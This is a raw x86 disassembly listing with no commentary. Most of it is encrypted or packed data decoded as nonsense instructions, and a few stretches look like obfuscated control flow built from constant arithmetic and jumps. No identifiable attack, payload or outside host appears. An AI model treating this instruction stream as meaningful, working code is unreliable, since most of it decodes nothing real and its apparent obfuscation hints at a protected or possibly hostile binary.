  419592:	stos   DWORD PTR es:[edi],eax
  419593:	mov    edi,0x8b067548
  419598:	rol    BYTE PTR [esi+0x75],0x56
  41959c:	push   cs
  41959d:	(bad)
  4195a0:	lods   eax,DWORD PTR ds:[esi]
  4195a1:	fcom   st(5)
  4195a3:	and    eax,DWORD PTR [esi-0x59]
  4195a6:	sub    ebx,DWORD PTR [edi+0x37]
  4195a9:	mov    eax,0x5dc30eec
  4195ae:	or     DWORD PTR [eax],edi
  4195b0:	lods   al,BYTE PTR ds:[esi]
  4195b1:	xor    eax,0x943a3200
  4195b6:	jmp    0x2bc95747
  4195bb:	adc    DWORD PTR [ecx+ecx*1],ebx
  4195be:	mov    ds:0xc668b1b5,al
  4195c3:	xor    al,0x84
  4195c5:	mov    edi,0xc0841525
  4195ca:	call   0xbc84:0x5c0a0976
  4195d1:	mov    ds:0x671b4233,al
  4195d6:	(bad)  
  4195d7:	stc    
  4195d8:	jno    0x419573
  4195da:	lock and al,0xe0
  4195dd:	pop    edx
  4195de:	scas   al,BYTE PTR es:[edi]
  4195df:	mov    al,ds:0x6c443ca7
  4195e4:	cli    
  4195e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195e6:	aad    0x8c
  4195e8:	(bad)  
  4195e9:	in     al,dx
  4195ea:	ret    
  4195eb:	lock xchg edx,eax
  4195ed:	fisub  WORD PTR [ebx-0x42c597ab]
  4195f3:	or     al,0x92
  4195f5:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4195f7:	xchg   ebx,eax
  4195f8:	rcr    BYTE PTR [ebx],1
  4195fa:	mul    DWORD PTR ds:0xd48f113c
  419600:	aas    
  419601:	mov    dl,0xcf
  419603:	data16 add al,0x4d
  419606:	jnp    0x419667
  419608:	int3   
  419609:	bound  ebx,QWORD PTR [esi]
  41960b:	or     al,0xf
  41960d:	push   0xa0ddd961
  419612:	stc    
  419613:	imul   ebx,DWORD PTR [ecx],0x28
  419616:	imul   eax,DWORD PTR [ebx+0x32],0xffffffce
  41961a:	xchg   ebp,eax
  41961b:	(bad)  
  41961c:	es xor ebp,ebx
  41961f:	mov    ds:0xe1f78e63,al
  419624:	mov    edx,0x502b7e64
  419629:	mov    DWORD PTR [ecx*4-0x4b2022c2],ecx
  419630:	shr    BYTE PTR [ecx],cl
  419632:	mov    bl,0x7d
  419634:	and    BYTE PTR [ebx-0x7d98a7bd],bl
  41963a:	loop   0x41962e
  41963c:	adc    esi,edx
  41963e:	or     esp,DWORD PTR [edx+0x1e6f9b40]
  419644:	xchg   edi,eax
  419645:	jmp    0x41967e
  419647:	add    eax,DWORD PTR [eax-0x29353877]
  41964d:	jb     0x4195e6
  41964f:	or     DWORD PTR [ebx+edx*1+0x38a81ed1],ecx
  419656:	or     cx,dx
  419659:	mov    edx,0x21a4
  41965e:	or     cx,dx
  419661:	mov    dx,WORD PTR [esp+0x2c]
  419666:	sub    cx,dx
  419669:	mov    dx,WORD PTR [esp+0x38]
  41966e:	sub    cx,dx
  419671:	mov    dx,WORD PTR [esp+0x3c]
  419676:	cmp    dx,cx
  419679:	jbe    0x41a320
  41967f:	mov    ecx,0x5008
  419684:	jmp    0x4198e1
  419689:	xchg   ebx,eax
  41968a:	sub    al,0x3f
  41968c:	jae    0x419706
  41968e:	mov    esp,0x77bf2cb3
  419693:	jo     0x419672
  419695:	outs   dx,DWORD PTR ds:[esi]
  419696:	xor    ah,BYTE PTR [edx-0x3ff65470]
  41969c:	mov    esi,0xbebec235
  4196a1:	push   eax
  4196a2:	test   eax,0x3541c256
  4196a7:	mov    eax,ecx
  4196a9:	xchg   ebx,eax
  4196aa:	clc    
  4196ab:	pop    edx
  4196ac:	ss test eax,ebp
  4196af:	ficom  WORD PTR [edx]
  4196b1:	ins    BYTE PTR es:[edi],dx
  4196b2:	enter  0xfe87,0x10
  4196b6:	fimul  DWORD PTR [edx]
  4196b8:	inc    esp
  4196b9:	aam    0x83
  4196bb:	ds inc ecx
  4196bd:	pusha  
  4196be:	add    BYTE PTR cs:[edi-0x79a4cdf],bh
  4196c5:	gs in  eax,dx
  4196c7:	addr16 and al,0xdd
  4196ca:	(bad)  
  4196cb:	lahf   
  4196cc:	fstp   TBYTE PTR [edi-0x52ff3e04]
  4196d2:	cmp    al,0xed
  4196d4:	push   ss
  4196d5:	push   es
  4196d6:	and    DWORD PTR [edi],esi
  4196d8:	pushf  
  4196d9:	add    BYTE PTR [ebx],al
  4196db:	ret    
  4196dc:	and    edi,ebp
  4196de:	pop    ss
  4196df:	out    dx,eax
  4196e0:	ds cmp eax,0x88ff70c3
  4196e6:	mov    al,0x60
  4196e8:	sub    BYTE PTR [ebx+0x168835ca],ah
  4196ee:	jp     0x41968d
  4196f0:	fidiv  DWORD PTR [eax+0x9]
  4196f3:	cmp    al,0x59
  4196f5:	xor    ch,BYTE PTR [esi-0x2d1a1024]
  4196fb:	je     0x419737
  4196fd:	inc    ecx
  4196fe:	pop    esp
  4196ff:	mov    al,0xa
  419701:	clc    
  419702:	add    ebp,DWORD PTR [edi-0x4f]
  419705:	iret   
  419706:	inc    esp
  419707:	mov    ebx,0x1831e961
  41970c:	push   esi
  41970d:	mov    esp,0x56e44146
  419712:	inc    ebx
  419713:	add    DWORD PTR [esp+ebx*1-0x1cdf78bc],edx
  41971a:	mov    al,0x14
  41971c:	pop    eax
  41971d:	jae    0x419742
  41971f:	gs xchg edx,eax
  419721:	mov    ch,bl
  419723:	dec    esp
  419724:	and    eax,0x66460c1
  419729:	pop    ss
  41972a:	mov    ebx,0x8f3a946d
  41972f:	arpl   WORD PTR [esi+0x1a],bp
  419732:	push   es
  419733:	(bad)  
  419734:	jmp    0x419791
  419736:	mov    eax,0x9caa6256
  41973b:	add    al,0x1a
  41973d:	xor    al,0x48
  41973f:	out    dx,al
  419740:	fcom   DWORD PTR [edi+eax*8+0x28b1600c]
  419747:	adc    al,0x30
  419749:	out    dx,eax
  41974a:	lods   al,BYTE PTR ds:[esi]
  41974b:	push   ebp
  41974c:	xlat   BYTE PTR ds:[ebx]
  41974d:	push   edi
  41974f:	or     BYTE PTR ds:0x1071073f,al
  419755:	jmp    0x41978b
  419757:	mov    al,0x7
  419759:	pop    ebx
  41975a:	xchg   edi,eax
  41975b:	sahf   
  41975c:	imul   ecx,DWORD PTR [esi],0x74541662
  419762:	lds    ebp,FWORD PTR [edx+edx*1+0x490d8a53]
  419769:	xchg   edi,eax
  41976a:	sti    
  41976b:	jb     0x419795
  41976d:	fnsave [ecx+0x51]
  419770:	pop    edi
  419771:	fdivr  st(2),st
  419773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419774:	adc    eax,0xe80d7fdf
  419779:	scas   al,BYTE PTR es:[edi]
  41977a:	lods   eax,DWORD PTR ds:[esi]
  41977b:	xor    DWORD PTR [eax+edx*4],0x2472b6aa
  419782:	push   ecx
  419783:	inc    ebp
  419784:	mov    dl,0x35
  419786:	inc    ebx
  419787:	fld    DWORD PTR [esi]
  419789:	ja     0xeb18549a
  41978f:	xchg   DWORD PTR gs:[esp+eax*4],esp
  419793:	retf   
  419794:	cdq    
  419795:	pop    ebp
  419796:	fnstcw WORD PTR [edi]
  419798:	ds hlt 
  41979a:	or     bl,dl
  41979c:	(bad)  
  41979e:	rcl    dl,cl
  4197a0:	out    0x1f,al
  4197a2:	test   ebp,ecx
  4197a4:	jo     0x41973d
  4197a6:	xchg   esi,ebx
  4197a8:	shl    DWORD PTR [edx-0x5c5bdfd2],cl
  4197ae:	or     al,0xd0
  4197b0:	mov    ds:0x60c31e6b,al
  4197b5:	mov    BYTE PTR ds:0xc27f24d9,bh
  4197bb:	and    esp,DWORD PTR [ecx]
  4197bd:	xchg   esi,eax
  4197be:	adc    al,0x5b
  4197c0:	shufps xmm4,XMMWORD PTR cs:[ebx-0x57],0x2d
  4197c6:	mov    bl,0x3e
  4197c8:	mov    bh,0xd6
  4197ca:	add    DWORD PTR [edx+0x2b],ecx
  4197cd:	jl     0x419783
  4197cf:	adc    bh,cl
  4197d1:	inc    esi
  4197d2:	jle    0x419836
  4197d4:	jecxz  0x4197ef
  4197d6:	adc    al,0xef
  4197d8:	jle    0x4197bc
  4197da:	enter  0x5aab,0x7d
  4197de:	iret   
  4197df:	jb     0x4197f0
  4197e1:	pop    es
  4197e2:	mov    bl,0x1a
  4197e4:	gs dec ebx
  4197e6:	jl     0x41983e
  4197e8:	pusha  
  4197e9:	mov    DWORD PTR [ecx+0x17],ebx
  4197ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197ed:	mov    gs,WORD PTR [ecx]
  4197ef:	sub    DWORD PTR [esi],esp
  4197f1:	inc    ecx
  4197f2:	push   ebx
  4197f3:	fstp   TBYTE PTR ds:0x3c24c4c6
  4197f9:	inc    edx
  4197fa:	and    BYTE PTR [ebx],dl
  4197fc:	cdq    
  4197fd:	push   edi
  4197fe:	das    
  4197ff:	sahf   
  419800:	pause  
  419802:	mov    DWORD PTR [ebp-0x2cff1580],edi
  419808:	frstor [ebp-0x80]
  41980b:	ret    0x6a84
  41980e:	mov    ah,BYTE PTR [ecx+0x1]
  419811:	out    dx,eax
  419812:	xor    BYTE PTR [edx+eiz*2-0x44e5a17d],al
  419819:	leave  
  41981a:	push   ss
  41981b:	and    ch,BYTE PTR [edx+edi*8-0x12]
  41981f:	std    
  419820:	jne    0x4197fb
  419822:	pop    ds
  419823:	iret   
  419824:	adc    eax,0x94fbc042
  419829:	aam    0xc5
  41982b:	mov    esi,0xb8b5cb75
  419830:	jns    0x4197fb
  419832:	push   edi
  419833:	cmp    al,0x4d
  419835:	in     eax,dx
  419836:	ret    0xc1c7
  419839:	mov    esp,0xaa043637
  41983e:	push   0x48
  419840:	mov    esp,0x51f4a88b
  419845:	jmp    DWORD PTR [ecx-0x7a391626]
  41984b:	mov    edi,0x6595a79f
  419850:	sbb    edi,DWORD PTR [eax]
  419852:	mov    BYTE PTR [eax+eax*4],ch
  419855:	shl    BYTE PTR [edx-0x48],cl
  419858:	les    ebx,FWORD PTR ds:0x6c242d94
  41985e:	or     DWORD PTR [ebx-0x5094458c],ecx
  419864:	js     0x419884
  419866:	push   ebp
  419867:	scas   al,BYTE PTR es:[edi]
  419868:	inc    ecx
  419869:	es in  al,0x64
  41986c:	cmp    bh,BYTE PTR [eax+0x4]
  41986f:	push   ebx
  419870:	dec    ebx
  419871:	stos   BYTE PTR es:[edi],al
  419872:	outs   dx,BYTE PTR ds:[esi]
  419873:	or     eax,DWORD PTR [edx+eiz*8-0x2349b4e4]
  41987a:	xchg   ebx,eax
  41987b:	fidivr WORD PTR [ebx]
  41987d:	push   0xb0439f17
  419882:	and    ah,bl
  419884:	mov    bh,0xe8
  419886:	mov    cl,0xd2
  419888:	mov    eax,ds:0x480bec21
  41988d:	inc    esp
  41988e:	fild   WORD PTR [eax-0x3f]
  419891:	jl     0x4198c9
  419893:	repnz xchg edx,eax
  419895:	and    al,0xa8
  419897:	add    eax,0xf4cbe50a
  41989c:	mov    bh,0x4
  41989e:	ror    esp,cl
  4198a0:	push   edi
  4198a1:	(bad)  
  4198a2:	push   edi
  4198a3:	test   BYTE PTR [ebx],cl
  4198a5:	and    dl,BYTE PTR [ebp-0x15]
  4198a8:	jmp    0x41983a
  4198aa:	sar    eax,1
  4198ac:	in     al,0x22
  4198ae:	sbb    ecx,esi
  4198b0:	adc    DWORD PTR [ebp+esi*8-0x66],0xffffffad
  4198b5:	repnz pop ss
  4198b7:	push   ecx
  4198b8:	mov    dh,0x33
  4198ba:	pop    ebx
  4198bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198bc:	cli    
  4198bd:	fadd   QWORD PTR [edi+0x1c2bbc3]
  4198c3:	dec    esi
  4198c4:	sar    BYTE PTR [esi+0x4d9c4e9a],cl
  4198ca:	xor    ah,BYTE PTR [ebx-0x3112ac5]
  4198d0:	cmc    
  4198d1:	and    DWORD PTR ds:0xb4b4f90f,esi
  4198d7:	mov    al,0x29
  4198d9:	imul   edx,DWORD PTR [eax-0x37],0xffffffde
  4198dd:	dec    ebx
  4198de:	div    BYTE PTR [edi+0x4c89664b]
  4198e4:	and    al,0x24
  4198e6:	mov    ecx,0x60ce
  4198eb:	mov    WORD PTR [esp+0xc],cx
  4198f0:	movzx  ecx,WORD PTR [esp+0xc]
  4198f5:	mov    edx,0x2095
  4198fa:	or     cx,dx
  4198fd:	mov    dx,WORD PTR [esp+0x24]
  419902:	sub    cx,dx
  419905:	jmp    0x419b62
  41990a:	loop   0x419959
  41990c:	push   eax
  41990d:	xchg   ebx,eax
  41990e:	je     0x4198a4
  419910:	and    ch,BYTE PTR [edi-0x307dfe70]
  419916:	test   DWORD PTR [esi],ebx
  419918:	mov    dh,0xa4
  41991a:	and    al,0xd
  41991c:	sar    BYTE PTR [esi-0x41413dcb],0x37
  419923:	jns    0x4198cb
  419925:	xchg   ecx,eax
  419926:	pop    esp
  419927:	repz aad 0xb
  41992a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41992b:	xor    DWORD PTR [ecx+0x2c],0x25
  41992f:	or     BYTE PTR [edi-0x4f],ah
  419932:	sub    al,0xf2
  419934:	adc    eax,0x4a876786
  419939:	dec    ebx
  41993a:	cmp    eax,0x1a94b24c
  41993f:	fs shr eax,1
  419942:	pop    esi
  419943:	fwait
  419944:	ja     0x419939
  419946:	call   0x9ee5:0xe1e0f4ef
  41994d:	sbb    al,0x9b
  41994f:	ss pop ss
  419951:	sar    ah,0xbd
  419954:	cdq    
  419955:	cmp    DWORD PTR [ecx+0x16],0xffffffab
  419959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41995a:	mov    esi,0x988839f7
  41995f:	adc    DWORD PTR [ebx+eax*8-0x2f],edi
  419963:	inc    edx
  419964:	ja     0x419986
  419966:	hlt    
  419967:	jbe    0x41996b
  419969:	scas   al,BYTE PTR es:[edi]
  41996a:	mov    eax,0xfdba513b
  41996f:	gs inc ebx
  419971:	imul   edx,DWORD PTR [ecx-0x2],0xffffff8a
  419975:	xor    eax,ecx
  419977:	push   0xffffffb4
  419979:	in     al,0xcd
  41997b:	div    DWORD PTR [edx]
  41997d:	add    al,0x88
  41997f:	not    DWORD PTR [esi+ecx*8]
  419982:	xor    dh,dl
  419984:	out    dx,al
  419985:	and    DWORD PTR [ebx+0x5797776c],esp
  41998b:	mov    ah,0x36
  41998d:	in     al,dx
  41998e:	mov    edi,0x67518c1d
  419993:	and    esi,DWORD PTR [edi]
  419995:	(bad)
  419999:	(bad)
  41999c:	fisttp DWORD PTR [eax-0x9]
  41999f:	leave  
  4199a0:	repnz inc ecx
  4199a2:	jne    0x419936
  4199a4:	xchg   DWORD PTR [esi-0x66],esp
  4199a7:	sti    
  4199a8:	imul   eax,DWORD PTR [ebp-0x35f8f64b],0x5f
  4199af:	call   0xeb0:0x3eaa70c2
  4199b6:	test   eax,0x299e7250
  4199bb:	rep lods eax,DWORD PTR ds:[esi]
  4199bd:	add    ch,BYTE PTR es:[eax]
  4199c0:	loopne 0x4199ee
  4199c2:	xor    eax,0xe857250d
  4199c7:	jmp    0x419965
  4199c9:	push   ebx
  4199ca:	call   0x9219e8b1
  4199cf:	lahf   
  4199d0:	push   edi
  4199d1:	jmp    0x4442:0xa5145e8e
  4199d8:	test   eax,0x3527e988
  4199dd:	fcmovb st,st(6)
  4199df:	es enter 0x67d0,0x51
  4199e4:	das    
  4199e5:	outs   dx,DWORD PTR ds:[esi]
  4199e6:	mov    bl,0x92
  4199e8:	loop   0x4199a0
  4199ea:	int3   
  4199eb:	iret   
  4199ec:	jmp    0xc667f160
  4199f1:	dec    esp
  4199f2:	add    al,0x37
  4199f4:	push   0xffffff88
  4199f6:	rol    BYTE PTR [esi],cl
  4199f8:	mov    cl,0xdb
  4199fa:	mov    ecx,ebp
  4199fc:	sbb    al,0x66
  4199fe:	dec    ecx
  4199ff:	imul   ebp,DWORD PTR [edx+0x2d8e7b88],0x3ac695bc
  419a09:	pop    ss
  419a0a:	(bad)  
  419a0e:	pop    eax
  419a0f:	shl    DWORD PTR [eax],cl
  419a11:	je     0x4199e3
  419a13:	(bad)  
  419a14:	ds xor edx,esi
  419a17:	mov    dh,0xe0
  419a19:	sbb    BYTE PTR [ecx+ecx*2],0xfa
  419a1d:	cmp    ebx,DWORD PTR [ecx-0x5]
  419a20:	out    0x1e,eax
  419a22:	push   esi
  419a23:	fisub  DWORD PTR [edi-0x4]
  419a26:	sbb    eax,0x8ad5f1ea
  419a2b:	js     0x419a25
  419a2d:	mov    BYTE PTR [ebp-0x6a],bl
  419a30:	or     BYTE PTR [esp+ebp*2],cl
  419a33:	xor    bh,BYTE PTR [edx]
  419a35:	mov    ebp,0x2d6e4d5d
  419a3a:	pop    ebx
  419a3b:	inc    esi
  419a3c:	inc    edx
  419a3d:	mov    eax,ds:0x3d95b7a7
  419a42:	out    dx,al
  419a43:	ja     0x419a22
  419a45:	cmp    edi,DWORD PTR [ebx+ebp*8+0x68]
  419a49:	adc    dh,ah
  419a4b:	cs fwait
  419a4d:	push   ss
  419a4e:	jmp    0x419a0e
  419a50:	ret    0x11db
  419a53:	gs jmp 0x419a43
  419a56:	stc    
  419a57:	pop    ebp
  419a58:	call   0xe1b6:0x8ef119ee
  419a5f:	rcl    DWORD PTR [ecx+0x22],0xb9
  419a63:	retf   
  419a64:	imul   eax
  419a66:	and    eax,0x998dbad8
  419a6b:	sub    al,BYTE PTR [eax+0x5d9a0e83]
  419a71:	jle    0x419a8c
  419a73:	arpl   WORD PTR [esi+esi*4-0x18],ax
  419a77:	mov    fs,WORD PTR [eax+0x1a]
  419a7a:	inc    esp
  419a7b:	and    eax,0xcdff6367
  419a80:	lods   eax,DWORD PTR ds:[esi]
  419a81:	pop    edi
  419a82:	out    dx,eax
  419a83:	mov    edi,0x3261305c
  419a88:	out    0xfe,eax
  419a8a:	cmp    ah,BYTE PTR [edx]
  419a8c:	sahf   
  419a8d:	sbb    BYTE PTR ds:0xd36bb2b7,0x0
  419a94:	xlat   BYTE PTR ds:[ebx]
  419a95:	inc    edi
  419a96:	xor    DWORD PTR [edx],esi
  419a98:	into   
  419a99:	cmp    ah,bh
  419a9b:	jl     0x419a24
  419a9d:	fld    DWORD PTR [ebx-0x42570097]
  419aa3:	sbb    edi,edx
  419aa5:	iret   
  419aa6:	xor    al,0x8c
  419aa8:	inc    eax
  419aa9:	mov    ch,0x36
  419aab:	cmc    
  419aac:	out    dx,eax
  419aad:	jbe    0x419a82
  419aaf:	inc    ebx
  419ab0:	call   0xb8027340
  419ab5:	and    eax,0x2248a723
  419aba:	cdq    
  419abb:	out    dx,eax
  419abc:	mov    dl,0x29
  419abe:	stos   DWORD PTR es:[edi],eax
  419abf:	mov    ds:0x15ec9e3e,eax
  419ac4:	inc    ebx
  419ac5:	adc    cl,BYTE PTR ss:[ebp-0x12]
  419ac9:	sar    esp,cl
  419acb:	jne    0x419af1
  419acd:	imul   esp,DWORD PTR [eax],0xdf152b39
  419ad3:	inc    ebx
  419ad4:	pusha  
  419ad5:	push   ebx
  419ad6:	out    0x2e,al
  419ad8:	popf   
  419ad9:	mov    ds:0xb0906e28,eax
  419ade:	inc    edi
  419adf:	adc    eax,0xed1ca624
  419ae4:	aam    0xc1
  419ae6:	mov    bh,0x87
  419ae8:	cmp    al,BYTE PTR [eax-0xddf3c0e]
  419aee:	mov    dl,0xf4
  419af0:	fld    TBYTE PTR [ebp-0x1c]
  419af3:	sub    bl,BYTE PTR [ebp+0x11]
  419af6:	or     eax,DWORD PTR [ebx-0x79092380]
  419afc:	cmp    ebp,eax
  419afe:	cmp    DWORD PTR [edx+0x4520f6a1],eax
  419b04:	out    0xe2,eax
  419b06:	and    cl,BYTE PTR [ebx-0x3ac57028]
  419b0c:	rol    DWORD PTR [edi+0x33a50dd6],cl
  419b12:	push   esi
  419b13:	aam    0x10
  419b15:	(bad)  
  419b16:	clc    
  419b17:	mov    al,ds:0xd3eb8598
  419b1c:	std    
  419b1d:	nop
  419b1e:	fwait
  419b1f:	gs xchg bl,bl
  419b22:	cs out 0x57,al
  419b25:	imul   ebx,edi,0xde5e0cd6
  419b2b:	xor    esp,esi
  419b2d:	adc    al,BYTE PTR [edi+0x4]
  419b30:	pop    ds
  419b31:	inc    esp
  419b32:	lahf   
  419b33:	dec    ebp
  419b34:	pop    ecx
  419b35:	xchg   ebx,eax
  419b36:	sub    ebx,edi
  419b38:	ins    BYTE PTR es:[edi],dx
  419b39:	xor    al,0xd
  419b3b:	xor    ch,BYTE PTR [esi+0x21651a72]
  419b41:	jle    0x419bba
  419b43:	jmp    0x593d:0x839d3d3b
  419b4a:	lahf   
  419b4b:	out    0xb3,eax
  419b4d:	pop    ecx
  419b4e:	sbb    cl,bh
  419b50:	push   edx
  419b51:	and    eax,0xbb820905
  419b56:	add    al,0x33
  419b58:	mov    esi,0xebd4e9cc
  419b5d:	xchg   edi,eax
  419b5e:	stos   BYTE PTR es:[edi],al
  419b5f:	stos   DWORD PTR es:[edi],eax
  419b60:	or     eax,0x10deba24
  419b65:	add    BYTE PTR [eax],al
  419b67:	or     ecx,0x742f
  419b6d:	imul   ecx,ecx,0x30b2
  419b73:	mov    WORD PTR [esp+0x3c],cx
  419b78:	mov    ecx,0x6143
  419b7d:	mov    WORD PTR [esp+0x38],cx
  419b82:	mov    ecx,0x679f
  419b87:	mov    WORD PTR [esp+0x2c],cx
  419b8c:	mov    ecx,0x1210
  419b91:	mov    WORD PTR [esp+0x24],cx
  419b96:	mov    ecx,0x3308
  419b9b:	mov    WORD PTR [esp+0xc],cx
  419ba0:	mov    cx,WORD PTR [esp+0xc]
  419ba5:	sub    cx,dx
  419ba8:	jmp    0x419e05
  419bad:	jge    0x419b6c
  419baf:	into   
  419bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb1:	mov    ?,WORD PTR [esp+esi*4-0x51b6fd1d]
  419bb8:	iret   
  419bb9:	pop    esi
  419bba:	xor    DWORD PTR [edx+edx*4-0x64],edi
  419bbe:	adc    eax,eax
  419bc0:	mov    esi,0xbebec235
  419bc5:	cwde   
  419bc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bc7:	mov    cl,0xda
  419bc9:	lods   al,BYTE PTR ds:[esi]
  419bca:	and    cl,BYTE PTR [ecx+0x2c]
  419bcd:	dec    ebp
  419bce:	cld    
  419bcf:	adc    eax,DWORD PTR [esi-0x736f2f16]
  419bd5:	popa   
  419bd6:	div    BYTE PTR [edx]
  419bd8:	adc    BYTE PTR [edi+0x30601312],0xe9
  419bdf:	fsub   DWORD PTR [ebp+0x7567633e]
  419be5:	jmp    0x22b6:0x22395aaa
  419bec:	or     al,0x15
  419bee:	clc    
  419bef:	mov    eax,0x1a483c4b
  419bf4:	iret   
  419bf5:	sbb    eax,0x1fdae360
  419bfa:	xchg   ecx,eax
  419bfb:	jp     0x419bfa
  419bfd:	ret    
  419bfe:	repnz das 
  419c00:	jecxz  0x419bbd
  419c02:	cli    
  419c03:	test   BYTE PTR [edi+0x5e],cl
  419c06:	fcmovu st,st(3)
  419c08:	xor    al,al
  419c0a:	inc    esp
  419c0b:	fwait
  419c0c:	pop    esi
  419c0d:	xor    dl,BYTE PTR [edi-0x31]
  419c10:	mov    bh,bh
  419c12:	cld    
  419c13:	fsubr  DWORD PTR [ebp+0x16]
  419c16:	fdivp  st(1),st
  419c18:	retf   0xb54a
  419c1b:	cmp    dh,BYTE PTR [edi]
  419c1d:	adc    eax,0xbb7f9123
  419c22:	shl    BYTE PTR [eax+0x4e783d13],0x5c
  419c29:	nop
  419c2a:	pop    edx
  419c2b:	push   ds
  419c2c:	push   edx
  419c2d:	mov    dl,BYTE PTR [ebp+0x7a]
  419c30:	mov    WORD PTR [eax-0x1c],es
  419c33:	mov    dl,0x24
  419c35:	sbb    edi,DWORD PTR [edx]
  419c37:	xchg   bh,ah
  419c39:	bound  edi,QWORD PTR [ebp-0x6f]
  419c3c:	push   0xffffff98
  419c3e:	test   ch,bl
  419c40:	xor    BYTE PTR [esp+esi*8+0x57],ah
  419c44:	rcl    ecx,cl
  419c46:	pop    ds
  419c47:	fs inc esi
  419c49:	sub    al,0x6
  419c4b:	mov    ecx,0x299de51c
  419c50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c51:	inc    ecx
  419c52:	mov    bl,0x53
  419c54:	mov    ebx,0x77fa592d
  419c59:	iret   
  419c5a:	lahf   
  419c5b:	jp     0x419ca5
  419c5d:	push   ss
  419c5e:	shl    bh,0x5b
  419c61:	fnstcw WORD PTR [ebx]
  419c63:	jno    0x419c19
  419c65:	sbb    eax,0xe555f64d
  419c6a:	lahf   
  419c6b:	(bad)  
  419c6c:	in     al,dx
  419c6d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c6f:	adc    ebp,ebp
  419c71:	mov    ah,0x3e
  419c73:	adc    BYTE PTR [edi+0x229d39ee],ch
  419c79:	push   0x564c54c8
  419c7e:	fidivr DWORD PTR [ecx+0x77d38980]
  419c84:	cs loope 0x419c7d
  419c87:	push   edx
  419c88:	lahf   
  419c89:	fdiv   QWORD PTR [edi+ebx*8]
  419c8c:	and    al,0x58
  419c8e:	loop   0x419cb3
  419c90:	inc    esp
  419c91:	(bad)  
  419c92:	sbb    dh,BYTE PTR [ecx-0x2f976fc4]
  419c98:	mov    bh,BYTE PTR [ecx-0x8809d43]
  419c9e:	leave  
  419c9f:	and    DWORD PTR [ebx-0x6d],edx
  419ca2:	inc    esp
  419ca3:	sbb    DWORD PTR ds:0x13c2a721,esi
  419ca9:	sar    DWORD PTR [esp+eax*2-0x9d84938],0x9b
  419cb1:	(bad)  
  419cb2:	int3   
  419cb3:	xchg   esi,eax
  419cb4:	ins    DWORD PTR es:[edi],dx
  419cb5:	inc    esi
  419cb6:	cmp    DWORD PTR [edx],0x7
  419cb9:	lock out 0x31,eax
  419cbc:	les    eax,FWORD PTR [ebx]
  419cbe:	inc    edi
  419cbf:	imul   esi,DWORD PTR [edx+0x7],0xffffffbb
  419cc3:	stc    
  419cc4:	pop    edi
  419cc5:	test   BYTE PTR [edi-0x645fc228],dh
  419ccb:	dec    ecx
  419ccc:	rcr    DWORD PTR [ecx],cl
  419cce:	jbe    0x419d49
  419cd0:	xlat   BYTE PTR ds:[ebx]
  419cd1:	cmp    DWORD PTR [edx+eax*8+0x72],0xffffffa0
  419cd6:	or     al,0x3d
  419cd8:	test   al,0xc2
  419cda:	inc    eax
  419cdb:	xchg   ebx,eax
  419cdc:	push   ebp
  419cdd:	retf   
  419cde:	jl     0x419c6d
  419ce0:	in     eax,0x59
  419ce2:	adc    al,0xb0
  419ce4:	adc    DWORD PTR [esi],0x90616d4f
  419cea:	push   ebp
  419ceb:	fdivrp st(2),st
  419ced:	cwde   
  419cee:	int    0xcc
  419cf0:	mov    ebx,0xc8e07b02
  419cf5:	jae    0x419d21
  419cf7:	mov    ebp,0x6c1f6701
  419cfc:	pop    esp
  419cfd:	sub    DWORD PTR [edx],eax
  419cff:	push   ecx
  419d00:	ss jnp 0x419ca0
  419d03:	rcr    DWORD PTR [edi+0x1b7c077],cl
  419d09:	mov    ch,0x1c
  419d0b:	iret   
  419d0c:	into   
  419d0d:	cmp    bl,bh
  419d0f:	dec    esi
  419d10:	mov    eax,0x602a0c9c
  419d15:	outs   dx,DWORD PTR ds:[esi]
  419d16:	mov    ecx,ebx
  419d18:	dec    edx
  419d19:	addr16 adc eax,0x51c309c1
  419d1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d20:	mov    al,ds:0xe63a606c
  419d25:	std    
  419d26:	mov    cl,0x5b
  419d28:	sub    al,0x6f
  419d2a:	fld    DWORD PTR [esi]
  419d2c:	retf   0x9041
  419d2f:	push   esp
  419d30:	sbb    bl,BYTE PTR [ebx]
  419d32:	repz mov eax,0x27a589e7
  419d38:	mov    bl,0x99
  419d3a:	xchg   ecx,eax
  419d3b:	pop    eax
  419d3c:	popa   
  419d3d:	or     eax,0x3b521ca7
  419d42:	add    ecx,DWORD PTR [ecx-0x4e]
  419d45:	mov    ch,0x3f
  419d47:	mov    al,0x59
  419d49:	pop    eax
  419d4a:	ss mov ch,0x76
  419d4d:	in     eax,dx
  419d4e:	inc    ebx
  419d4f:	sub    ebx,ecx
  419d51:	cmp    DWORD PTR [eax-0x3f2bff68],0x9cec3551
  419d5b:	or     edi,0x44
  419d5e:	jne    0x419d34
  419d60:	stos   DWORD PTR es:[edi],eax
  419d61:	xor    ch,BYTE PTR [esi-0x5c025a89]
  419d67:	sti    
  419d68:	or     DWORD PTR [ebp+0x3bc55898],ebx
  419d6e:	push   0xffffff9e
  419d70:	jmp    0x9194a4ef
  419d75:	inc    edx
  419d76:	cmc    
  419d77:	rsm    
  419d79:	ds sti 
  419d7b:	or     al,0x22
  419d7d:	ds inc ebx
  419d7f:	addr16 int 0xaa
  419d82:	mov    edx,0xaee0703e
  419d87:	mov    esi,edx
  419d89:	adc    edi,0x6a0950bb
  419d8f:	inc    ebp
  419d90:	pop    edi
  419d91:	dec    ebp
  419d92:	xchg   DWORD PTR [ebx],esi
  419d94:	in     al,dx
  419d95:	push   cs
  419d96:	imul   eax,edi,0x29db4e1a
  419d9c:	bound  ebx,QWORD PTR [eax+edi*4]
  419d9f:	push   ebx
  419da0:	in     eax,0xc2
  419da2:	inc    esp
  419da3:	or     BYTE PTR ds:0x5d33739c,dh
  419da9:	adc    BYTE PTR [eax+0x2e],dh
  419dac:	icebp  
  419dad:	cmp    al,0xac
  419daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
